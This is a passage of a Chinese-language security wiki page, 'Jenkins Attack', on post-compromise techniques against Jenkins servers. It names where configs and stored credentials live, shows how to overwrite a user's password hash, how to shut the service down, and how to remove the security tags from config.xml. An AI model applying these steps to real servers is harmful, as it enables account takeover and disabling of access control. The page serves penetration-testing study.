<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-DevOpsAttack/Jenkins/Jenkins" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.1.0">
<title data-rh="true">Jenkins Attack 🦖 Whoopsunix</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://whoopsunix.com/docs/DevOpsAttack/Jenkins/"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Jenkins Attack 🦖 Whoopsunix"><meta data-rh="true" name="description" content="0x00 查看版本"><meta data-rh="true" property="og:description" content="0x00 查看版本"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://whoopsunix.com/docs/DevOpsAttack/Jenkins/"><link data-rh="true" rel="alternate" href="https://whoopsunix.com/docs/DevOpsAttack/Jenkins/" hreflang="en"><link data-rh="true" rel="alternate" href="https://whoopsunix.com/docs/DevOpsAttack/Jenkins/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Whoopsunix RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Whoopsunix Atom Feed"><link rel="stylesheet" href="/assets/css/styles.e447ecda.css">
<link rel="preload" href="/assets/js/runtime~main.9b49e382.js" as="script">
<link rel="preload" href="/assets/js/main.c18b1eab.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><b class="navbar__title text--truncate">Whoopsunix</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/time/">WIKI</a><a class="navbar__item navbar__link" href="/blog">Blog</a><a class="navbar__item navbar__link" href="/docs/tags">Tag</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/Whoopsunix" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/time/">时间线</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/PPPYSO/">PPPYSO</a><button aria-label="Expand sidebar category &#x27;PPPYSO&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/category/java-安全">Java 安全</a><button aria-label="Expand sidebar category &#x27;Java 安全&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/components/">组件漏洞分析</a><button aria-label="Expand sidebar category &#x27;组件漏洞分析&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/readTeam/">RT Attack</a><button aria-label="Expand sidebar category &#x27;RT Attack&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/docs/DevOpsAttack/">DevOps Attack</a><button aria-label="Collapse sidebar category &#x27;DevOps Attack&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/DevOpsAttack/cicd-goat/">通过 cicd-goat 靶场学习Top 10 CI/CD Security Risks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/DevOpsAttack/Jenkins/">Jenkins Attack</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/DevOpsAttack/"><span itemprop="name">DevOps Attack</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Jenkins Attack</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Jenkins Attack</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x00-查看版本">0x00 查看版本<a href="#0x00-查看版本" class="hash-link" aria-label="Direct link to 0x00 查看版本" title="Direct link to 0x00 查看版本">​</a></h2>
<p><a href="http://localhost:8080/login" target="_blank" rel="noopener noreferrer">http://localhost:8080/login</a></p>
<p><img loading="lazy" alt="image-20240327105323776" src="/assets/images/image-20240327105323776-9baa8699c1494a8e4c8370d6888f4bed.png" width="1826" height="768" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x01-关键信息">0x01 关键信息<a href="#0x01-关键信息" class="hash-link" aria-label="Direct link to 0x01 关键信息" title="Direct link to 0x01 关键信息">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="文件">文件<a href="#文件" class="hash-link" aria-label="Direct link to 文件" title="Direct link to 文件">​</a></h3>
<p>JENKINS_HOME/config.xml  整体配置信息</p>
<p>JENKINS_HOME/jobs/{xxx}/config.xml  具体管道下的配置信息，设置的凭据也可以在这下面找到</p>
<p><img loading="lazy" alt="image-20240327173421994" src="/assets/images/image-20240327173421994-f0f5079f1039f9c1500de416cc1b10be.png" width="2192" height="928" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="环境变量">环境变量<a href="#环境变量" class="hash-link" aria-label="Direct link to 环境变量" title="Direct link to 环境变量">​</a></h3>
<p><a href="http://localhost:8080/env-vars.html" target="_blank" rel="noopener noreferrer">http://localhost:8080/env-vars.html</a></p>
<p><img loading="lazy" alt="image-20240328160943629" src="/assets/images/image-20240328160943629-1fe1dd8f947fb8c7b89ae04206d5a569.png" width="957" height="443" class="img_ev3q"></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">BRANCH_NAME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project, this will be set to the name of the branch being built, for example in case you wish to deploy to production from master but not from feature branches; if corresponding to some kind of change request, the name is generally arbitrary (refer to CHANGE_ID and CHANGE_TARGET).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BRANCH_IS_PRIMARY</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project, if the SCM source reports that the branch being built is a primary branch, this will be set to &quot;true&quot;; else unset. Some SCM sources may report more than one branch as a primary branch while others may not supply this information.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHANGE_ID</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of change request, this will be set to the change ID, such as a pull request number, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHANGE_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of change request, this will be set to the change URL, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHANGE_TITLE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of change request, this will be set to the title of the change, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHANGE_AUTHOR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of change request, this will be set to the username of the author of the proposed change, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHANGE_AUTHOR_DISPLAY_NAME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of change request, this will be set to the human name of the author, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHANGE_AUTHOR_EMAIL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of change request, this will be set to the email address of the author, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHANGE_TARGET</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of change request, this will be set to the target or base branch to which the change could be merged, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHANGE_BRANCH</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of change request, this will be set to the name of the actual head on the source control system which may or may not be different from BRANCH_NAME. For example in GitHub or Bitbucket this would have the name of the origin branch whereas BRANCH_NAME would be something like PR-24.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CHANGE_FORK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of change request, this will be set to the name of the forked repo if the change originates from one; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TAG_NAME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of tag, this will be set to the name of the tag being built, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TAG_TIMESTAMP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of tag, this will be set to a timestamp of the tag in milliseconds since Unix epoch, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TAG_UNIXTIME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of tag, this will be set to a timestamp of the tag in seconds since Unix epoch, if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TAG_DATE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">For a multibranch project corresponding to some kind of tag, this will be set to a timestamp in the format as defined by java.util.Date#toString() (e.g., Wed Jan 1 00:00:00 UTC 2020), if supported; else unset.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JOB_DISPLAY_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">URL that will redirect to a Job in a preferred user interface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN_DISPLAY_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">URL that will redirect to a Build in a preferred user interface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN_ARTIFACTS_DISPLAY_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">URL that will redirect to Artifacts of a Build in a preferred user interface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN_CHANGES_DISPLAY_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">URL that will redirect to Changelog of a Build in a preferred user interface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN_TESTS_DISPLAY_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">URL that will redirect to Test Results of a Build in a preferred user interface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CI</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Statically set to the string &quot;true&quot; to indicate a &quot;continuous integration&quot; execution environment.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUILD_NUMBER</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The current build number, such as &quot;153&quot;.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUILD_ID</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The current build ID, identical to BUILD_NUMBER for builds created in 1.597+, but a YYYY-MM-DD_hh-mm-ss timestamp for older builds.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUILD_DISPLAY_NAME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The display name of the current build, which is something like &quot;#153&quot; by default.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JOB_NAME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name of the project of this build, such as &quot;foo&quot; or &quot;foo/bar&quot;.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JOB_BASE_NAME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Short Name of the project of this build stripping off folder paths, such as &quot;foo&quot; for &quot;bar/foo&quot;.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUILD_TAG</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">String of &quot;jenkins-${JOB_NAME}-${BUILD_NUMBER}&quot;. All forward slashes (&quot;/&quot;) in the JOB_NAME are replaced with dashes (&quot;-&quot;). Convenient to put into a resource file, a jar file, etc for easier identification.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EXECUTOR_NUMBER</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The unique number that identifies the current executor (among executors of the same machine) that’s carrying out this build. This is the number you see in the &quot;build executor status&quot;, except that the number starts from 0, not 1.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NODE_NAME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name of the agent if the build is on an agent, or &quot;built-in&quot; if run on the built-in node (or &quot;master&quot; until Jenkins 2.306).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NODE_LABELS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Whitespace-separated list of labels that the node is assigned.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WORKSPACE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The absolute path of the directory assigned to the build as a workspace.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WORKSPACE_TMP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">A temporary directory near the workspace that will not be browsable and will not interfere with SCM checkouts. May not initially exist, so be sure to create the directory as needed (e.g., mkdir -p on Linux). Not defined when the regular workspace is a drive root.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JENKINS_HOME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The absolute path of the directory assigned on the controller file system for Jenkins to store data.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JENKINS_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Full URL of Jenkins, like http://server:port/jenkins/ (note: only available if Jenkins URL set in system configuration).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUILD_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Full URL of this build, like http://server:port/jenkins/job/foo/15/ (Jenkins URL must be set).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JOB_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Full URL of this job, like http://server:port/jenkins/job/foo/ (Jenkins URL must be set).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_COMMIT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The commit hash being checked out.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_PREVIOUS_COMMIT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The hash of the commit last built on this branch, if any.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_PREVIOUS_SUCCESSFUL_COMMIT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The hash of the commit last successfully built on this branch, if any.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_BRANCH</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The remote branch name, if any.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_LOCAL_BRANCH</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The local branch name being checked out, if applicable.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_CHECKOUT_DIR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The directory that the repository will be checked out to. This contains the value set in Checkout to a sub-directory, if used.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_URL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The remote URL. If there are multiple, will be GIT_URL_1, GIT_URL_2, etc.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_COMMITTER_NAME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The configured Git committer name, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.name Value field of the Jenkins Configure System page.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_AUTHOR_NAME</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The configured Git author name, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.name Value field of the Jenkins Configure System page.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_COMMITTER_EMAIL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The configured Git committer email, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.email Value field of the Jenkins Configure System page.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GIT_AUTHOR_EMAIL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The configured Git author email, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.email Value field of the Jenkins Configure System page.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x02-用户相关">0x02 用户相关<a href="#0x02-用户相关" class="hash-link" aria-label="Direct link to 0x02 用户相关" title="Direct link to 0x02 用户相关">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修改已有用户密码">修改已有用户密码<a href="#修改已有用户密码" class="hash-link" aria-label="Direct link to 修改已有用户密码" title="Direct link to 修改已有用户密码">​</a></h3>
<p>位于 <code>$JENKINS_HOME/users/</code> 目录下</p>
<p><img loading="lazy" alt="image-20240327135540294" src="/assets/images/image-20240327135540294-804f9a5fde81c489531ad31fa1e29586.png" width="1384" height="104" class="img_ev3q"></p>
<p><code>users.xml</code> 文件获取用户列表以及对应的目录</p>
<p><img loading="lazy" alt="image-20240327140624283" src="/assets/images/image-20240327140624283-185e94f2ebaab007e5aebe7e51a0fd49.png" width="996" height="648" class="img_ev3q"></p>
<p><code>$JENKINS_HOME/users/alice_13254336614910464357/config.xml</code>  ，读取用户目录下的 <code>config.xml</code> 文件</p>
<p>通常关注这三个信息</p>
<ul>
<li>用户密码，<code>&lt;passwordHash&gt;</code> 字段使用 JBCript 加密，对应源码中的加密类 <code>HudsonPrivateSecurityRealm</code>，直接用 CyberChef 加密</li>
</ul>
<p><img loading="lazy" alt="image-20240328174744696" src="/assets/images/image-20240328174744696-ffa89fdd7e47871613a51669e6979204.png" width="1958" height="984" class="img_ev3q"></p>
<ul>
<li>用户Token，使用sha256哈希编码</li>
<li>用户种子</li>
</ul>
<p><img loading="lazy" alt="image-20240327141804444" src="/assets/images/image-20240327141804444-d39b76049a338a39bd4b2e7235404f0c.png" width="2110" height="1654" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="生效密码">生效密码<a href="#生效密码" class="hash-link" aria-label="Direct link to 生效密码" title="Direct link to 生效密码">​</a></h4>
<p>需要有 <code>Administer permission</code> 权限的用户登陆，然后通过 <a href="http://localhost:8080/reload" target="_blank" rel="noopener noreferrer">http://localhost:8080/reload</a> 点击 <code>Retry using POST</code> 重载配置</p>
<p><img loading="lazy" alt="image-20240327163140285" src="/assets/images/image-20240327163140285-029bd74d48011d1478e7a1583a5090a3.png" width="1330" height="482" class="img_ev3q"></p>
<p><strong>其他！</strong></p>
<p><a href="http://localhost:8080/exit" target="_blank" rel="noopener noreferrer">http://localhost:8080/exit</a> ，点击 <code>Retry using POST</code>  关闭jenkins服务</p>
<p><a href="http://localhost:8080/restrat" target="_blank" rel="noopener noreferrer">http://localhost:8080/restrat</a> 重  启 jenkins 服务器</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="默认密码">默认密码<a href="#默认密码" class="hash-link" aria-label="Direct link to 默认密码" title="Direct link to 默认密码">​</a></h3>
<p>位于 <code>$JENKINS_HOME/secrets/initialAdminPassword</code> ，如果不存在代表已经被修改</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="删除后重新生成">删除后重新生成<a href="#删除后重新生成" class="hash-link" aria-label="Direct link to 删除后重新生成" title="Direct link to 删除后重新生成">​</a></h4>
<p>删除如下几个 tag</p>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">useSecurity</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">useSecurity</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">authorizationStrategy</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">class</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">hudson.security.FullControlOnceLoggedInAuthorizationStrategy</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">denyAnonymousReadAccess</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">denyAnonymousReadAccess</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">authorizationStrategy</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">securityRealm</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">class</span><span class="token tag attr-value punctuation 